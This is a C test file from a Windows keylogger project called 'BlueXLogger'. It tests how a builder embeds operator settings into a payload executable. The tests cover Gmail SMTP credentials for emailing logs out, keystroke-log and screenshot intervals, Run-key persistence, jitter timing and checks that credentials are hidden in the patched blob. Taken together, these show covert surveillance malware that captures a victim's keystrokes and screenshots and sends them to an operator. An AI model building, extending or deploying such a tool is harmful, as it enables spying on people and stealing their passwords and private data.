/*============================================================================
 * BlueXLogger - tests/test_config.c
 * Configuration model, integrity and round-trip tests.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Covers the full path the builder relies on:
 *   operator settings -> BxlConfig -> serialize -> blob -> deserialize
 *   blob -> sidecar file -> read back
 *   blob -> embedded RCDATA slot in a real payload EXE -> read back
 * The last one is skipped with a printed note when no payload path is given.
 *==========================================================================*/
#include "tests.h"
#include "bxl_config.h"
#include "bxl_patch.h"
#include "bxl_util.h"

/*==========================================================================
 * Helpers
 *========================================================================*/

/* BXL_TRUE when needle does not occur anywhere in the byte range. */
static int memmem_absent(const char *hay, size_t hay_len, const char *needle)
{
    size_t nlen = strlen(needle), i;
    if (nlen == 0 || hay_len < nlen) return BXL_TRUE;
    for (i = 0; i + nlen <= hay_len; i++)
        if (memcmp(hay + i, needle, nlen) == 0) return BXL_FALSE;
    return BXL_TRUE;
}

static void make_valid(BxlConfig *c)
{
    bxl_config_defaults(c);
    StringCchCopyA(c->recipient, BXL_MAX_EMAIL, "operator.recipient@gmail.com");
    StringCchCopyA(c->sender,    BXL_MAX_EMAIL, "operator.sender@gmail.com");
    StringCchCopyA(c->app_password, BXL_MAX_PASS, "abcd efgh ijkl mnop");
    StringCchCopyA(c->smtp_host, BXL_MAX_HOST, "smtp.gmail.com");
    c->smtp_port     = 465;
    c->tls_mode      = BXL_TLS_IMPLICIT;
    c->auth_enabled  = 1;
    bxl_config_sanitize(c);
}

/* Byte-for-byte comparison. Every config in this suite starts from
 * bxl_config_defaults(), which memsets the whole struct, so padding bytes are
 * deterministic and a plain memcmp is meaningful. */
static int same(const BxlConfig *a, const BxlConfig *b)
{
    return memcmp(a, b, sizeof(*a)) == 0;
}

static void tmp_path(wchar_t *out, size_t cch, const wchar_t *name)
{
    wchar_t dir[MAX_PATH * 2];
    if (!bxl_path_temp_dir(dir, BXL_COUNT_OF(dir)))
        dir[0] = L'\0';
    if (!bxl_path_join(out, cch, dir, name))
        out[0] = L'\0';
}

/*==========================================================================
 * CRC32
 *========================================================================*/
static void t_crc(void)
{
    t_begin("CRC32 matches the canonical check vector");
    T_INT(bxl_crc32("123456789", 9), 0xCBF43926u);
    T_INT(bxl_crc32("", 0), 0x00000000u);
}

/*==========================================================================
 * Defaults
 *========================================================================*/
static void t_defaults(void)
{
    BxlConfig c;

    t_begin("defaults are internally consistent");
    bxl_config_defaults(&c);
    T_INT(c.struct_size, sizeof(BxlConfig));
    T_INT(c.version, 1);
    T_STR(c.smtp_host, "smtp.gmail.com");
    T_INT(c.smtp_port, 465);
    T_INT(c.tls_mode, BXL_TLS_IMPLICIT);
    T_INT(c.auth_enabled, 1);

    t_begin("no credentials are baked in by default");
    T_STR(c.recipient, "");
    T_STR(c.sender, "");
    T_STR(c.app_password, "");

    t_begin("persistence is OFF by default");
    T_INT(c.persistence, BXL_PERSIST_OFF);

    t_begin("anti-spam triggers default to a sane interval");
    T_INT(c.log_interval_min, 10);
    T_INT(c.shot_enabled, 1);
    T_INT(c.shot_interval_min, 15);

    t_begin("attachment budget stays under Gmail's ceiling");
    T_OK(c.max_attach_bytes <= BXL_MAX_ATTACH_BYTES_MAX);

    t_begin("a default config passes its own integrity check");
    T_OK(bxl_config_verify(&c) == BXL_TRUE);
}

/*==========================================================================
 * Sanitize
 *========================================================================*/
static void t_sanitize(void)
{
    BxlConfig c;

    t_begin("both log triggers zeroed is repaired to an interval");
    bxl_config_defaults(&c);
    c.log_interval_min = 0;
    c.log_keystroke_threshold = 0;
    bxl_config_sanitize(&c);
    T_INT(c.log_interval_min, 10);

    t_begin("out-of-range values are clamped, not rejected");
    bxl_config_defaults(&c);
    c.jitter_percent     = 200;
    c.retention_days     = 99999;
    c.shot_jpeg_quality  = 0;
    c.persistence        = 99;
    c.smtp_port          = 0;
    c.tls_mode           = 99;
    c.shot_max_count     = 0;
    bxl_config_sanitize(&c);
    T_INT(c.jitter_percent, 50);
    T_INT(c.retention_days, 365);
    T_INT(c.shot_jpeg_quality, 80);
    T_INT(c.persistence, BXL_PERSIST_OFF);
    T_INT(c.smtp_port, 465);
    T_INT(c.tls_mode, BXL_TLS_IMPLICIT);
    T_INT(c.shot_max_count, 8);

    t_begin("attachment budget is clamped to the documented window");
    bxl_config_defaults(&c);
    c.max_attach_bytes = 1;
    bxl_config_sanitize(&c);
    T_INT(c.max_attach_bytes, BXL_MAX_ATTACH_BYTES_MIN);
    c.max_attach_bytes = 0xFFFFFFFFu;
    bxl_config_sanitize(&c);
    T_INT(c.max_attach_bytes, BXL_MAX_ATTACH_BYTES_MAX);

    t_begin("sanitize re-seals the CRC");
    T_OK(bxl_config_verify(&c) == BXL_TRUE);
}

/*==========================================================================
 * Integrity
 *========================================================================*/
static void t_integrity(void)
{
    BxlConfig c;

    t_begin("tampering with a field breaks verification");
    make_valid(&c);
    T_OK(bxl_config_verify(&c) == BXL_TRUE);
    c.smtp_port = 25;
    T_OK(bxl_config_verify(&c) == BXL_FALSE);
    bxl_config_seal(&c);
    T_OK(bxl_config_verify(&c) == BXL_TRUE);

    t_begin("a struct with the wrong size is rejected");
    c.struct_size = 1;
    T_OK(bxl_config_verify(&c) == BXL_FALSE);
}

/*==========================================================================
 * Serialize / deserialize round trip
 *========================================================================*/
static void t_roundtrip(void)
{
    BxlConfig a, b;
    bxl_u8 blob[BXL_CFG_SLOT_SIZE];
    size_t n;

    t_begin("a full config survives the blob round trip");
    make_valid(&a);
    a.log_interval_min          = 7;
    a.log_keystroke_threshold   = 250;
    a.shot_enabled              = 1;
    a.shot_format               = BXL_FMT_JPEG;
    a.shot_jpeg_quality         = 63;
    a.daily_enabled             = 1;
    a.daily_hour                = 22;
    a.daily_minute              = 45;
    a.jitter_enabled            = 1;
    a.jitter_percent            = 17;
    a.persistence               = BXL_PERSIST_RUNKEY;
    a.hotkey_enabled            = 1;
    a.hotkey_vk                 = 'K';
    a.max_attach_bytes          = 9u * 1024u * 1024u;
    StringCchCopyA(a.storage_dir, BXL_MAX_PATH, "C:\\BlueX\\spool");
    bxl_config_seal(&a);

    memset(blob, 0xAA, sizeof(blob));
    n = bxl_config_serialize(&a, blob, sizeof(blob));
    T_INT(n, BXL_CFG_HEADER_LEN + sizeof(BxlConfig));

    t_begin("blob header carries the configured magic and version");
    T_OK(memcmp(blob, BXL_CFG_MAGIC_OK, 6) == 0);
    T_INT(blob[8], 1);

    t_begin("credentials are not left in plaintext in the blob");
    T_OK(memmem_absent((const char *)blob, n, "abcd efgh ijkl mnop"));
    T_OK(memmem_absent((const char *)blob, n, "operator.recipient@gmail.com"));

    memset(&b, 0, sizeof(b));
    t_begin("deserialize restores every field");
    T_OK(bxl_config_deserialize(blob, n, &b) == BXL_TRUE);
    T_OK(same(&a, &b));
    T_STR(b.recipient, "operator.recipient@gmail.com");
    T_STR(b.app_password, "abcd efgh ijkl mnop");
    T_INT(b.log_keystroke_threshold, 250);
    T_INT(b.daily_hour, 22);
    T_INT(b.jitter_percent, 17);
    T_INT(b.persistence, BXL_PERSIST_RUNKEY);
    T_STR(b.storage_dir, "C:\\BlueX\\spool");

    t_begin("deserialize rejects a corrupted body");
    blob[BXL_CFG_HEADER_LEN + 8] ^= 0xFF;
    T_OK(bxl_config_deserialize(blob, n, &b) == BXL_FALSE);

    t_begin("deserialize rejects the wrong magic");
    memset(blob, 0, sizeof(blob));
    memcpy(blob, BXL_CFG_MAGIC_EMPTY, 6);
    T_OK(bxl_config_deserialize(blob, n, &b) == BXL_FALSE);

    t_begin("deserialize rejects a truncated blob");
    make_valid(&a);
    n = bxl_config_serialize(&a, blob, sizeof(blob));
    T_OK(bxl_config_deserialize(blob, BXL_CFG_HEADER_LEN, &b) == BXL_FALSE);
    T_OK(bxl_config_deserialize(blob, n - 1, &b) == BXL_FALSE);
}

/*==========================================================================
 * Placeholder
 *========================================================================*/
static void t_placeholder(void)
{
    bxl_u8 slot[BXL_CFG_SLOT_SIZE];
    BxlConfig c;
    size_t n;

    t_begin("make_placeholder stamps the empty magic");
    n = bxl_config_make_placeholder(slot, sizeof(slot));
    T_INT(n, BXL_CFG_SLOT_SIZE);
    T_OK(bxl_config_is_placeholder(slot, n) == BXL_TRUE);

    t_begin("the placeholder is deliberately not a readable config");
    /* make_placeholder keeps a structurally valid default body in the slot so
     * the template is usable unpatched, but it stamps the empty magic over the
     * header. A payload must therefore refuse to deserialize it and fall back
     * to built-in defaults instead of silently adopting whatever is there. */
    T_OK(bxl_config_deserialize(slot, n, &c) == BXL_FALSE);
    T_OK(bxl_config_is_placeholder(slot, n) == BXL_TRUE);

    t_begin("a serialized real config is not a placeholder");
    make_valid(&c);
    n = bxl_config_serialize(&c, slot, sizeof(slot));
    T_OK(bxl_config_is_placeholder(slot, n) == BXL_FALSE);
}

/*==========================================================================
 * Validation
 *========================================================================*/
static void t_validate(void)
{
    BxlConfig c;
    char err[256];

    t_begin("a complete config validates");
    make_valid(&c);
    err[0] = '\0';
    T_OK(bxl_config_validate(&c, err, sizeof(err)) == BXL_TRUE);
    T_STR(err, "");

    t_begin("a malformed recipient is rejected with a reason");
    make_valid(&c);
    StringCchCopyA(c.recipient, BXL_MAX_EMAIL, "not-an-address");
    bxl_config_seal(&c);
    T_OK(bxl_config_validate(&c, err, sizeof(err)) == BXL_FALSE);
    T_OK(err[0] != '\0');

    t_begin("a short app password is rejected");
    make_valid(&c);
    StringCchCopyA(c.app_password, BXL_MAX_PASS, "abc");
    bxl_config_seal(&c);
    T_OK(bxl_config_validate(&c, err, sizeof(err)) == BXL_FALSE);

    t_begin("a CRC mismatch is reported as an integrity failure");
    make_valid(&c);
    c.smtp_port = 1234;                 /* seal not re-run */
    T_OK(bxl_config_validate(&c, err, sizeof(err)) == BXL_FALSE);
    T_OK(bxl_str_icontains(err, "integrity") == BXL_TRUE);

    t_begin("screenshots enabled with a zero interval is rejected");
    make_valid(&c);
    c.shot_enabled = 1;
    c.shot_interval_min = 0;
    bxl_config_seal(&c);
    T_OK(bxl_config_validate(&c, err, sizeof(err)) == BXL_FALSE);
}

/*==========================================================================
 * Sidecar round trip
 *========================================================================*/
static void t_sidecar(void)
{
    BxlConfig a, b;
    wchar_t path[MAX_PATH * 2];

    tmp_path(path, BXL_COUNT_OF(path), L"bxl_test_sidecar.cfg");

    t_begin("sidecar path helper appends BlueXLogger.cfg");
    {
        wchar_t sc[MAX_PATH * 2];
        T_OK(bxl_config_sidecar_path(L"C:\\Some Dir\\BlueXLogger.exe",
                                     sc, BXL_COUNT_OF(sc)) == BXL_TRUE);
        T_STR_W(sc, L"C:\\Some Dir\\BlueXLogger.cfg");
    }

    t_begin("a config written to a sidecar reads back identically");
    make_valid(&a);
    a.log_interval_min = 3;
    StringCchCopyA(a.subject_prefix, BXL_MAX_SUBJECT, "BlueX test subject");
    bxl_config_seal(&a);

    T_OK(bxl_config_write_sidecar(path, &a) == BXL_TRUE);
    memset(&b, 0, sizeof(b));
    T_OK(bxl_config_read_sidecar(path, &b) == BXL_TRUE);
    T_OK(same(&a, &b));

    bxl_file_delete(path);
}

/*==========================================================================
 * Embedded patch round trip (needs a real payload EXE)
 *========================================================================*/
static void t_embedded(void)
{
    wchar_t out[MAX_PATH * 2];
    BxlConfig a, b;
    char err[256];
    int slot_found = 0, placeholder = 0;
    bxl_u32 slot_size = 0;

    if (g_payload_exe[0] == L'\0' || !bxl_path_exists(g_payload_exe)) {
        t_begin("embedded patch round trip");
        t_note("skipped: no payload EXE supplied on the command line");
        return;
    }

    tmp_path(out, BXL_COUNT_OF(out), L"bxl_test_patched.exe");
    bxl_file_delete(out);

    t_begin("the payload template ships a placeholder BXL_CFG slot");
    err[0] = '\0';
    T_OK(bxl_patch_inspect(g_payload_exe, &slot_found, &slot_size,
                           &placeholder, err, sizeof(err)) == BXL_TRUE);
    T_INT(slot_found, 1);
    T_INT(slot_size, BXL_CFG_SLOT_SIZE);
    T_INT(placeholder, 1);

    t_begin("a configured blob patches into a copy of the payload");
    make_valid(&a);
    StringCchCopyA(a.recipient, BXL_MAX_EMAIL, "roundtrip@gmail.com");
    a.log_keystroke_threshold = 42;
    a.persistence             = BXL_PERSIST_OFF;
    bxl_config_seal(&a);

    err[0] = '\0';
    T_OK(bxl_patch_write(g_payload_exe, out, &a, err, sizeof(err)) == BXL_TRUE);
    if (err[0]) t_note("patch error: %s", err);
    T_OK(bxl_path_exists(out) == BXL_TRUE);

    t_begin("the patched EXE reports a configured, non-placeholder slot");
    T_OK(bxl_patch_inspect(out, &slot_found, &slot_size,
                           &placeholder, err, sizeof(err)) == BXL_TRUE);
    T_INT(placeholder, 0);

    t_begin("the payload reads back exactly the settings the builder wrote");
    memset(&b, 0, sizeof(b));
    T_OK(bxl_patch_read(out, &b, err, sizeof(err)) == BXL_TRUE);
    T_STR(b.recipient, "roundtrip@gmail.com");
    T_STR(b.app_password, "abcd efgh ijkl mnop");
    T_INT(b.log_keystroke_threshold, 42);
    T_OK(same(&a, &b));

    t_begin("a template left unpatched reads back as no config");
    memset(&b, 0, sizeof(b));
    T_OK(bxl_patch_read(g_payload_exe, &b, err, sizeof(err)) == BXL_FALSE);

    bxl_file_delete(out);
}

/*==========================================================================
 * Suite entry point
 *========================================================================*/
void test_config(void)
{
    t_suite("configuration");
    t_crc();
    t_defaults();
    t_sanitize();
    t_integrity();
    t_roundtrip();
    t_placeholder();
    t_validate();
    t_sidecar();
    t_embedded();
}
